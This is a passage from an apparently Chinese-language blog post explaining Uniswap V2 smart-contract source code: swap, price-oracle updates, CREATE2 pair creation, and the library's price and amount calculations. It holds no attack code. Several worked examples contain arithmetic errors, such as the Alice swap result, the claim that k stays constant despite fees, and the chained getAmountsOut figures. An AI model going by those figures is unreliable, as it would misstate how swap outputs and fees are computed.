to, amount0);</span><br><span class="line">        _safeTransfer(_token1, to, amount1);</span><br><span class="line">        balance0 = IERC20(_token0).balanceOf(address(this));</span><br><span class="line">        balance1 = IERC20(_token1).balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">        _update(balance0, balance1, _reserve0, _reserve1);</span><br><span class="line">        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date</span><br><span class="line">        emit Burn(msg.sender, amount0, amount1, to);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="swap"><a href="#swap" class="headerlink" title="swap"></a>swap</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// 两种代币的交换（交易）</span><br><span class="line">    // this low-level function should be called from a contract which performs important safety checks</span><br><span class="line">    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock &#123;</span><br><span class="line"></span><br><span class="line">        // 为了兼容闪电贷功能，以及不依赖特定代币的transfer方法，整个swap方法并没有类似amountIn的参数，</span><br><span class="line">        // 而是通过比较当前余额与缓存余额的差值来得出转入的代币数量。</span><br><span class="line">        // 如果用户之前并没有向合约转入用于交易的代币，则相当于借币（即闪电贷）；</span><br><span class="line"></span><br><span class="line">        require(amount0Out &gt; 0 || amount1Out &gt; 0, &#x27;UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT&#x27;);</span><br><span class="line">        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings</span><br><span class="line">        require(amount0Out &lt; _reserve0 &amp;&amp; amount1Out &lt; _reserve1, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY&#x27;);</span><br><span class="line"></span><br><span class="line">        uint balance0;</span><br><span class="line">        uint balance1;</span><br><span class="line">        &#123; // scope for _token&#123;0,1&#125;, avoids stack too deep errors</span><br><span class="line">        address _token0 = token0; // gas saving</span><br><span class="line">        address _token1 = token1; // gas saving</span><br><span class="line">        require(to != _token0 &amp;&amp; to != _token1, &#x27;UniswapV2: INVALID_TO&#x27;);</span><br><span class="line">        if (amount0Out &gt; 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens</span><br><span class="line">        if (amount1Out &gt; 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens</span><br><span class="line">        // 如果使用闪电贷，则需要在自定义的uniswapV2Call方法中将借出的代币归还。</span><br><span class="line">        if (data.length &gt; 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);</span><br><span class="line">        balance0 = IERC20(_token0).balanceOf(address(this));</span><br><span class="line">        balance1 = IERC20(_token1).balanceOf(address(this));</span><br><span class="line">        &#125;</span><br><span class="line">        uint amount0In = balance0 &gt; _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;</span><br><span class="line">        uint amount1In = balance1 &gt; _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;</span><br><span class="line">        require(amount0In &gt; 0 || amount1In &gt; 0, &#x27;UniswapV2: INSUFFICIENT_INPUT_AMOUNT&#x27;);</span><br><span class="line">        &#123; // scope for reserve&#123;0,1&#125;Adjusted, avoids stack too deep errors</span><br><span class="line">        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));</span><br><span class="line">        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));</span><br><span class="line">        // 由于在swap方法最后会检查余额（扣掉手续费后）符合k恒等式约束（参考白皮书公式），因此合约可以先将用户希望获得的代币转出，</span><br><span class="line">        // 新的K值必须大于等于之前的K值，理论上由于手续费，K值会不断变大</span><br><span class="line">        require(balance0Adjusted.mul(balance1Adjusted) &gt;= uint(_reserve0).mul(_reserve1).mul(1000**2), &#x27;UniswapV2: K&#x27;); // 校验K值</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _update(balance0, balance1, _reserve0, _reserve1); // 使用缓存余额更新价格预言机所需的累计价格，最后更新缓存余额为当前余额。</span><br><span class="line">        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>swap的业务流程：</p><ol><li>为了兼容闪电贷功能并且不依赖特定代币的 transfer 方法，整个 swap 方法并没有类似 amountIn 的参数。而是通过比较当前余额与缓存余额的差值来得出转入的代币数量。如果用户之前没有向合约转入用于交易的代币，那么相当于借币（即闪电贷）。</li><li>swap 函数首先检查输出金额是否大于0，并获取储备量。然后，检查输出金额是否小于储备量，否则抛出异常。</li><li>在代码块中，将 token0 和 token1 分配给变量 _token0 和 _token1 以节省 gas。然后，检查接收者地址 to 是否为有效地址。</li><li>如果输出金额大于 0，使用 _safeTransfer 方法将相应代币发送到接收者地址 to。</li><li>如果 data 参数的长度大于 0，则调用 IUniswapV2Callee(to).uniswapV2Call 方法。这是一个回调函数，允许用户在闪电贷中执行任意操作，并在操作结束后归还借出的代币。</li><li>之后，计算代币0和代币1的实际转入数量。</li><li>确保转入金额大于0，然后计算调整后的余额，以确保 k 恒等式（一个关于 Uniswap 交易所价格的公式）得到满足。这是交易的核心约束条件，确保交易后市场保持平衡。</li><li>最后，使用 _update 方法更新预言机所需的累计价格和储备量，并触发 Swap 事件。</li><li>这个 swap 函数是 Uniswap V2 的关键组成部分，实现了在两种代币之间进行交换的功能。它处理了许多关键安全检查和约束条件，以确保交易过程中市场的稳定性。</li></ol><p>例子：假设 Alice 想要通过 Uniswap V2 交换一些代币。她拥有 100 个代币 A（Token A），想要将它们交换成代币 B（Token B）。假设当前 Uniswap V2 交易所上 Token A 和 Token B 的储备量分别为 1000 个和 2000 个。</p><ol><li>在交易前，k 值为 1000 * 2000 = 2,000,000。在交易后，我们需要确保调整后的 k 值仍然保持恒定。由于存在 0.3% 的手续费，实际上我们需要考虑这个手续费。</li><li>假设 Alice 可以获得 x 个 Token B，那么 Token A 的调整后余额为 (1000 + 100) <em> 1000 - 100 </em> 3 = 1,100,000，Token B 的调整后余额为 (2000 - x) <em> 1000 + x </em> 3 = 2,000,000 - 997x。我们需要找到一个 x 值，使得调整后的 k 值满足恒定条件：<br>1,100,000 <em> (2,000,000 - 997x) = 2,000,000 </em> 1,000,000<br>解得 x ≈ 181.82。</li><li>所以在本例中，Alice 可以获得约 181.82 个 Token B（实际交易中会取整数）。交易后的储备量分别为 1100 个 Token A 和 1818.18 个 Token B（实际交易中会取有限的小数位）。这样，k 值在交易前后保持恒定，为 2,000,000。</li></ol><h4 id="update"><a href="#update" class="headerlink" title="_update"></a>_update</h4><p>详细数学计算见uniswap_v2_digest</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// update reserves and, on the first call per block, price accumulators</span><br><span class="line">function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private &#123;</span><br><span class="line">    require(balance0 &lt;= uint112(-1) &amp;&amp; balance1 &lt;= uint112(-1), &#x27;UniswapV2: OVERFLOW&#x27;);</span><br><span class="line">    uint32 blockTimestamp = uint32(block.timestamp % 2**32);</span><br><span class="line">    uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired</span><br><span class="line">    if (timeElapsed &gt; 0 &amp;&amp; _reserve0 != 0 &amp;&amp; _reserve1 != 0) &#123; //间隔时间必须大于0，累计金额不能等于0</span><br><span class="line">        // * never overflows, and + overflow is desired</span><br><span class="line">        // 预言机：价格在链上不断的累加，比如今天累计的价格减去昨天累计的价格，再乘时间差</span><br><span class="line">        // tokenA = (tokenB / tokenA) * 时间差，得到tokenA累加的价格</span><br><span class="line">        price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;</span><br><span class="line">        // tokenB = (tokenA / tokenB) * 时间差，得到tokenB累加的价格</span><br><span class="line">        price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;</span><br><span class="line">    &#125;</span><br><span class="line">    reserve0 = uint112(balance0);</span><br><span class="line">    reserve1 = uint112(balance1);</span><br><span class="line">    blockTimestampLast = blockTimestamp;</span><br><span class="line">    emit Sync(reserve0, reserve1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="UniswapV2Factory"><a href="#UniswapV2Factory" class="headerlink" title="UniswapV2Factory"></a>UniswapV2Factory</h3><p>在工厂合约中最重要的是createPair方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function createPair(address tokenA, address tokenB) external returns (address pair) &#123;</span><br><span class="line">    require(tokenA != tokenB, &#x27;UniswapV2: IDENTICAL_ADDRESSES&#x27;);</span><br><span class="line">    // 排序，保证salt一样，保证无论代币对的输入顺序如何，生成的代币对地址一样</span><br><span class="line">    (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);</span><br><span class="line">    // 需要两个代币的合约地址不是0地址</span><br><span class="line">    // 因为token0比token1大，只要token0不是0地址，那么token1也不是0地址</span><br><span class="line">    require(token0 != address(0), &#x27;UniswapV2: ZERO_ADDRESS&#x27;); </span><br><span class="line">    // 只能够创建币对一次</span><br><span class="line">    require(getPair[token0][token1] == address(0), &#x27;UniswapV2: PAIR_EXISTS&#x27;); // single check is sufficient</span><br><span class="line">    bytes memory bytecode = type(UniswapV2Pair).creationCode;</span><br><span class="line">    bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line">    assembly &#123;</span><br><span class="line">        pair := create2(0, add(bytecode, 32), mload(bytecode), salt)</span><br><span class="line">    &#125;</span><br><span class="line">    IUniswapV2Pair(pair).initialize(token0, token1);</span><br><span class="line">    getPair[token0][token1] = pair;</span><br><span class="line">    getPair[token1][token0] = pair; // populate mapping in the reverse direction</span><br><span class="line">    allPairs.push(pair);</span><br><span class="line">    emit PairCreated(token0, token1, pair, allPairs.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先将token0 token1按照顺序排序，确保token0字面地址小于token1。接着使用assembly + create2创建合约。<a href="https://docs.soliditylang.org/en/develop/assembly.html#inline-assembly">assembly</a>可以在Solidity中使用<a href="https://docs.soliditylang.org/en/develop/yul.html#yul">Yul</a>语言直接操作EVM，是较底层的操作方法。</p><p>CREATE2出自<a href="https://eips.ethereum.org/EIPS/eip-1014">EIP-1014</a>，根据规范，这里能够影响最终生成地址的是用户自定义的salt值，只需要保证每次生成交易对合约时提供的salt值不同即可，对于同一个交易对的两种代币，其salt值应该一样；这里很容易想到应该使用交易对的两种代币地址，我们希望提供A/B地址的时候可以直接算出pair(A,B)，而两个地址又受顺序影响，因此在合约开始时先对两种代币进行排序，确保其按照从小到大的顺序生成salt值。</p><p>因为Uniswap v2合约在开发时还没有<code>给new方法传递salt参数</code>这个功能，所以使用assembly create2。</p><p>create2的原理和使用方法可以看我这个<a href="https://www.levi104.com/2022/11/27/02.solidity%E8%AF%AD%E6%B3%95/40.create2%E5%90%88%E7%BA%A6%E5%9C%B0%E5%9D%80%E8%AE%A1%E7%AE%97/#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8CREATE2">文章</a></p><h2 id="uniswap-v2-periphery"><a href="#uniswap-v2-periphery" class="headerlink" title="uniswap-v2-periphery"></a>uniswap-v2-periphery</h2><p>Router02封装了最常用的几个交易接口；为了满足原生ETH交易需求，大部分接口都支持ETH版本；同时，相比Router01，部分接口增加了FeeOnTrasnferTokens的支持。</p><p><img src="/2023/08/14/03.Uniswap/04.uniswap_v2_code/image-20230427142304596.png" alt="image-20230427142304596"></p><h3 id="libraries-UniswapV2Library"><a href="#libraries-UniswapV2Library" class="headerlink" title="libraries-UniswapV2Library"></a>libraries-UniswapV2Library</h3><h4 id="pairFor"><a href="#pairFor" class="headerlink" title="pairFor"></a>pairFor</h4><p>输入工厂地址和两个代币地址，计算这两个代币的交易对地址。由于使用CREATE2操作码，交易对地址可以直接根据规范算出，而无需调用链上合约进行查询。其中，新创建的pair合约的地址计算方法为：keccak256(0xff + this + salt + keccak256(mem[p…(p+n)))：</p><ul><li>this：工厂合约地址</li><li>salt：keccak256(abi.encodePacked(token0, token1))</li><li>keccak256(mem[p…(p+n))： 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// calculates the CREATE2 address for a pair without making any external calls</span><br><span class="line">function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) &#123;</span><br><span class="line">    (address token0, address token1) = sortTokens(tokenA, tokenB);</span><br><span class="line">    pair = address(uint(keccak256(abi.encodePacked(</span><br><span class="line">            hex&#x27;ff&#x27;,</span><br><span class="line">            factory,</span><br><span class="line">            keccak256(abi.encodePacked(token0, token1)),</span><br><span class="line">            hex&#x27;96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f&#x27; // init code hash</span><br><span class="line">        ))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="quote"><a href="#quote" class="headerlink" title="quote"></a>quote</h4><p>quote方法将数量为amountA的代币A，按照合约中两种代币余额比例，换算成另一个代币B。此时不考虑手续费，因为仅是计价单位的换算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// given some amount of an asset and pair reserves, returns an equivalent amount of the other asset</span><br><span class="line">function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) &#123;</span><br><span class="line">    require(amountA &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_AMOUNT&#x27;);</span><br><span class="line">    require(reserveA &gt; 0 &amp;&amp; reserveB &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;);</span><br><span class="line">    // B数量 = 预期输入A的数量 * B的储备量 / A的储备量</span><br><span class="line">    // 实际公式: amountA /amountB = reserveA / reserveB, 两个币的数量比例一致</span><br><span class="line">    amountB = amountA.mul(reserveB) / reserveA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="getAmountOut"><a href="#getAmountOut" class="headerlink" title="getAmountOut"></a>getAmountOut</h4><p>该方法计算：输入一定数量（amountIn）代币A，根据池子中代币余额，能得到多少数量（amountOut）代币B。</p><p>计算出来的价格是实际价格，即滑点之后的价格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset</span><br><span class="line">function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) &#123;</span><br><span class="line">    require(amountIn &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT&#x27;);</span><br><span class="line">    require(reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;);</span><br><span class="line">    uint amountInWithFee = amountIn.mul(997);</span><br><span class="line">    uint numerator = amountInWithFee.mul(reserveOut);</span><br><span class="line">    uint denominator = reserveIn.mul(1000).add(amountInWithFee);</span><br><span class="line">    amountOut = numerator / denominator;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，x0, y0为交换前的两种代币余额，x1, y1为交换后的两种代币余额，xin为输入的代币A数量，因为只提供代币A，因此yin=0；yout为需要计算的代币B数量。</p><p>可推导数学公式如下：</p><p><img src="/2023/08/14/03.Uniswap/04.uniswap_v2_code/image-20230502221407652.png" alt="image-20230502221407652"></p><p>由于Solidity不支持浮点数，因此可以换算成如下公式：</p><p><img src="/2023/08/14/03.Uniswap/04.uniswap_v2_code/image-20230502221416926.png" alt="image-20230502221416926"></p><p><img src="/2023/08/14/03.Uniswap/04.uniswap_v2_code/image-20230503150825785.png" alt="image-20230503150825785"></p><h4 id="getAmountIn"><a href="#getAmountIn" class="headerlink" title="getAmountIn"></a>getAmountIn</h4><p>该方法计算当希望获得一定数量（amountOut）的代币B时，应该输入多少数量（amoutnIn）的代币A。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// given an output amount of an asset and pair reserves, returns a required input amount of the other asset</span><br><span class="line">function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) &#123;</span><br><span class="line">    require(amountOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT&#x27;);</span><br><span class="line">    require(reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;);</span><br><span class="line">    uint numerator = reserveIn.mul(amountOut).mul(1000);</span><br><span class="line">    uint denominator = reserveOut.sub(amountOut).mul(997);</span><br><span class="line">    amountIn = (numerator / denominator).add(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getAmountOut是已知xin，计算yout；相对应地，getAmountIn则是已知yout，计算xin。根据上述公式可以推导出：</p><p><img src="/2023/08/14/03.Uniswap/04.uniswap_v2_code/image-20230502221641549.png" alt="image-20230502221641549"></p><p>计算结果即为合约中代码所示，注意最后有一个add(1)，这是为了防止amountIn为小数的情况，加1可以保证输入的数（amountIn）不小于理论的最小值。比如：需要输入0.5个token，但是0.5会被四舍五入没了，因此需要加一使其不小于理论的最小值。但是这样的话，我的每一笔交易几乎都是比理论值多输入1个token了？我无端端每次额外多给1token？k值不会被影响吗？</p><p>答案：比如我原本需要输入3个tokenA，然后加一，变成输入4个tokenA，但是实际上计算扣除的tokenA不是在这个地方计算的，而是在swap中计算。因此，这个方法是让我先拿出4个token，保证够钱扣(小数0.5加一变成1.5而不是0就是这个道理，不然0不够扣0.5了)。在扣除完3个tokenA之后，uniswap再发送回多的tokenA给我。或者另外一种说法是：+1是符合大家的利益，而-1是符合个人利益，uniswap成员其他人</p><h4 id="getAmountsOut"><a href="#getAmountsOut" class="headerlink" title="getAmountsOut"></a>getAmountsOut</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// performs chained getAmountOut calculations on any number of pairs</span><br><span class="line">function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) &#123;</span><br><span class="line">    require(path.length &gt;= 2, &#x27;UniswapV2Library: INVALID_PATH&#x27;);</span><br><span class="line">    amounts = new uint[](path.length);</span><br><span class="line">    amounts[0] = amountIn;</span><br><span class="line">    for (uint i; i &lt; path.length - 1; i++) &#123;</span><br><span class="line">        (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);</span><br><span class="line">        amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数<code>getAmountsOut</code>是Uniswap V2智能合约库中的一个方法，用于计算在多个交易对中的链式输出金额。它主要用于估算在进行多个交易对之间的交易时，用户可以获得的输出代币的数量。以下是该方法的详细分析：</p><ol><li>参数：<ul><li><code>factory</code> (address)：Uniswap V2工厂合约的地址。</li><li><code>amountIn</code> (uint)：用户输入的代币数量。</li><li><code>path</code> (address[] memory)：一个地址数组，包含了代币交换的路径。例如，如果想要通过交易对A-B和交易对B-C将代币A兑换为代币C，则路径为[A, B, C]。</li></ul></li><li>函数实现：<ul><li>首先，检查<code>path</code>的长度是否大于等于2，确保路径至少包含一个交易对。如果不符合条件，则抛出错误信息：”UniswapV2Library: INVALID_PATH”。</li><li>创建一个新的<code>amounts</code>数组，其长度与<code>path</code>相同。<code>amounts</code>数组将用于存储在每个交易对中的输出金额。</li><li>将<code>amounts[0]</code>设置为输入金额<code>amountIn</code>。</li><li>使用for循环遍历<code>path</code>数组中的代币地址（除最后一个之外），在每次循环中：<ul><li>调用<code>getReserves</code>函数以获取当前交易对（<code>path[i]</code>和<code>path[i + 1]</code>）的储备量（<code>reserveIn</code>和<code>reserveOut</code>）。</li><li>调用<code>getAmountOut</code>函数，传入当前输入金额（<code>amounts[i]</code>）、储备量（<code>reserveIn</code>和<code>reserveOut</code>），以计算输出金额，并将结果存储在<code>amounts[i + 1]</code>中。</li></ul></li></ul></li></ol><p>在完成所有循环后，<code>amounts</code>数组将包含每个交易对的输出金额。这个函数的主要目的是帮助用户在进行多个交易对之间的交易时，预估他们可以获得的输出代币数量。</p><p>举个例子：用户想要将代币A兑换为代币D，交易路径包括3个交易对：A-B，B-C和C-D。交易路径如下：[A, B, C, D]。现在，假设用户想要使用100个代币A进行交换。</p><p>我们可以使用<code>getAmountsOut</code>函数来估算用户最终可以获得的代币D的数量。以下是函数调用的示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getAmountsOut(factory, 100, [A, B, C, D]);</span><br></pre></td></tr></table></figure><p>现在，假设在每个交易对中的储备量如下：</p><ul><li>交易对A-B：代币A的储备量为10000，代币B的储备量为5000。</li><li>交易对B-C：代币B的储备量为5000，代币C的储备量为20000。</li><li>交易对C-D：代币C的储备量为20000，代币D的储备量为10000。</li></ul><p>在这种情况下，<code>getAmountsOut</code>函数将按照以下步骤计算输出金额：</p><ol><li><p>初始化<code>amounts</code>数组：[100, 0, 0, 0]。</p></li><li><p>计算交易对A-B的输出金额：</p><ul><li>输入金额：100。</li><li>储备量：代币A为10000，代币B为5000。</li><li>输出金额：根据<code>getAmountOut</code>的计算，得到大约49.75个代币B。</li><li>更新<code>amounts</code>数组：[100, 49.75, 0, 0]。</li></ul></li><li><p>计算交易对B-C的输出金额：</p><ul><li>输入金额：49.75。</li><li>储备量：代币B为5000，代币C为20000。</li><li>输出金额：根据<code>getAmountOut</code>的计算，得到大约199个代币C。</li><li>更新<code>amounts</code>数组：[100, 49.75, 199, 0]。</li></ul></li><li><p>计算交易对C-D的输出金额：</p><ul><li><p>输入金额：199。</p></li><li><p>储备量：代币C为20000，代币D为10000。</p></li><li><p>输出金额：根据<code>getAmountOut</code>的计算，得到大约99.5个代币D。</p></li><li><p>更新<code>amounts</code>数组：[100, 49.75, 199, 99.5]。</p></li></ul></li></ol><p>最终，<code>getAmountsOut</code>函数返回的<code>amounts</code>数组为：[100, 49.75, 199, 99.5]。这意味着用户可以通过这个交易路径将100个代币A兑换为大约99.5个代币D。</p><h4 id="getAmountsIn"><a href="#getAmountsIn" class="headerlink" title="getAmountsIn"></a>getAmountsIn</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// performs chained getAmountIn calculations on any number of pairs</span><br><span class="line">function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) &#123;</span><br><span class="line">    require(path.length &gt;= 2, &#x27;UniswapV2Library: INVALID_PATH&#x27;);</span><br><span class="line">    amounts = new uint[](path.length);</span><br><span class="line">    amounts[amounts.length - 1] = amountOut;</span><br><span class="line">    for (uint i = path.length - 1; i &gt; 0; i--) &#123;</span><br><span class="line">        (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]);</span><br><span class="line">        amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getAmountsIn</code>方法与<code>getAmountsOut</code>类似，但它的主要目的是计算多个交易对中链式输入金额，以获得预期的输出数量。例如，如果用户想要获得一定数量的目标代币，那么<code>getAmountsIn</code>方法可以帮助他们确定需要提供多少输入代币。</p><p>假设我们有以下情景：用户想要将代币A兑换为代币D，交易路径包括3个交易对：A-B，B-C和C-D。交易路径如下：[A, B, C, D]。现在，假设用户希望获得100个代币D。</p><p>我们可以使用<code>getAmountsIn</code>函数来估算用户需要提供多少代币A以获得100个代币D。以下是函数调用的示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getAmountsIn(factory, 100, [A, B, C, D]);</span><br></pre></td></tr></table></figure><p>与前一个示例相同，假设在每个交易对中的储备量如下：</p><ul><li>交易对A-B：代币A的储备量为10000，代币B的储备量为5000。</li><li>交易对B-C：代币B的储备量为5000，代币C的储备量为20000。</li><li>交易对C-D：代币C的储备量为20000，代币D的储备量为10000。</li></ul><p>在这种情况下，<code>getAmountsIn</code>函数将按照以下步骤计算输入金额：</p><ol><li>初始化<code>amounts</code>数组：[0, 0, 0, 100]。</li><li>计算交易对C-D所需的输入金额：<ul><li>输出金额：100。</li><li>储备量：代币C为20000，代币D为10000。</li><li>输入金额：根据<code>getAmountIn</code>的计算，得到大约198个代币C。</li><li>更新<code>amounts</code>数组：[0, 0, 198, 100]。</li></ul></li><li>计算交易对B-C所需的输入金额：<ul><li>输出金额：198。</li><li>储备量：代币B为5000，代币C为20000。</li><li>输入金额：根据<code>getAmountIn</code>的计算，得到大约49.5个代币B。</li><li>更新<code>amounts</code>数组：[0, 49.5, 198, 100]。</li></ul></li><li>计算交易对A-B所需的输入金额：<ul><li>输出金额：49.5。</li><li>储备量：代币A为10000，代币B为5000。</li><li>输入金额：根据<code>getAmountIn</code>的计算，得到大约100.5个代币A。</li><li>更新<code>amounts</code>数组：[100.5, 49.5, 198, 100]。</li></ul></li></ol><p>最终，<code>getAmountsIn</code>函数返回的<code>amounts</code>数组为：[100.5, 49.5, 198, 100]。这意味着用户大约需要用100.5个代币A通过这个交易路径兑换为100个代币D。</p><h3 id="contracts-UniswapV2Router02"><a href="#contracts-UniswapV2Router02" class="headerlink" title="contracts-UniswapV2Router02"></a>contracts-UniswapV2Router02</h3><h4 id="addLiquidity"><a href="#addLiquidity" class="headerlink" title="addLiquidity"></a>addLiquidity</h4><p>Adds liquidity to an ERC-20⇄ERC-20 pool.</p><ul><li>To cover all possible scenarios, <code>msg.sender</code> should have already given the router an allowance of at least amountADesired/amountBDesired on tokenA/tokenB.</li><li>Always adds assets at the ideal ratio, according to the price when the transaction is executed.</li><li>If a pool for the passed tokens does not exists, one is created automatically, and exactly amountADesired/amountBDesired tokens are added.</li></ul><div class="table-container"><table><thead><tr><th>Name</th><th>Type</th><th></th></tr></thead><tbody><tr><td>tokenA</td><td><code>address</code></td><td>A pool token.</td></tr><tr><td>tokenB</td><td><code>address</code></td><td>A pool token.</td></tr><tr><td>amountADesired</td><td><code>uint</code></td><td>The amount of tokenA to add as liquidity if the B/A price is &lt;= amountBDesired/amountADesired (A depreciates).</td></tr><tr><td>amountBDesired</td><td><code>uint</code></td><td>The amount of tokenB to add as liquidity if the A/B price is &lt;= amountADesired/amountBDesired (B depreciates).</td></tr><tr><td>amountAMin</td><td><code>uint</code></td><td>Bounds the extent to which the B/A price can go up before the transaction reverts. Must be &lt;= amountADesired.</td></tr><tr><td>amountBMin</td><td><code>uint</code></td><td>Bounds the extent to which the A/B price can go up before the transaction reverts. Must be &lt;= 